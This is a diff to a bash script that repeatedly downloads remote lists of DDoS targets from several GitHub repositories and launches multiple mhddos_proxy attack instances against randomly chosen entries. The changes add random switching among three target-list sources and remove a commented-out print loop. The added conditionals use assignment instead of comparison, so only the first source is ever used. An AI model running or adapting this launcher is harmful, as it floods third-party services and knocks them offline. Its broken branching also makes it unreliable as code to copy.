@@ -38,7 +38,25 @@ while true
 echo -e "#####################################\n"
 do
    
-   get_url=https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets
+   random_url=$(shuf -i 1-3 -n1)
+   if ((random_url=1));
+   then
+         ##my
+         echo -e "My list\n"
+         get_url=https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets
+   elif ((random_url=2));
+   then
+         ##zhnec
+         echo -e "ZHNEC_uato_mhddos\n"
+         get_url=https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets
+   elif ((random_url=3));
+   then
+         ##ddossepariv_
+         echo -e "DDOS_separiv_alexnest-ua\n"
+         get_url=https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux
+   fi
+   
+   ##get_url=https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets
    # Get number of targets in runner_targets. Only strings that are not commented out are used. Everything else is omitted.
    list_size=$(curl -s $get_url | cat | grep "^[^#]" | wc -l)
 
@@ -50,11 +68,6 @@ do
 
    # Print all randomly selected targets on screen
    echo -e "Choosen target(s): "
-   #for i in $random_numbers
-   #do
-   #          target=$(awk 'NR=='"$i" <<< "$(curl -s $get_url | cat | grep "^[^#]")")
-   #          echo -e "    "$target"\n"
-   #done
 
    # Launch multiple mhddos_proxy instances with different targets.
    for i in $random_numbers
